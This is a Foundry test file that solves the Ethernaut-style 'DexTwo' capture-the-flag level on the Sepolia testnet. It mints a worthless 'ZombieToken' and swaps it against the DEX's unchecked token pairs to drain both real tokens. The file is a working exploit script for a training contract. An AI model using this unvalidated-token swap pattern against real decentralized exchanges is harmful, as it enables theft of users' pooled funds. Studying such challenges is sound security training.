// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/23-DexTwo/DexTwo.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";

contract ContractTest is Test {
    ZombieToken ZombieTokenContract;
    DexTwo level23 = DexTwo(payable(0x885b0F838BF4fE1933264fb4b539EaEE615A08bb));

    function setUp() public {
    //Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    ZombieTokenContract = new ZombieToken();

    }

    function testExploit23() public {
        address mywallet = 0x7A30be98aFCeA6cf186751546af0C563e1e8Ae08;
        vm.startPrank(mywallet);
        ZombieTokenContract.transfer(address(level23),100);
        ZombieTokenContract.approve(address(level23),1000);
        address token1 = level23.token1();
        address token2 = level23.token2();
        level23.swap(address(ZombieTokenContract), token1, 100);
        level23.swap(address(ZombieTokenContract), token2, 200);

        console.log("Remaining token1 balance : ", level23.balanceOf(token1, address(level23)));
        console.log("Remaining token2 balance : ", level23.balanceOf(token2, address(level23)));
    }
  receive() external payable {}
}
 
contract ZombieToken is ERC20 {
    constructor() ERC20("ZombieToken", "ZTN") public {
        _mint(0x7A30be98aFCeA6cf186751546af0C563e1e8Ae08, 400);
    }
}
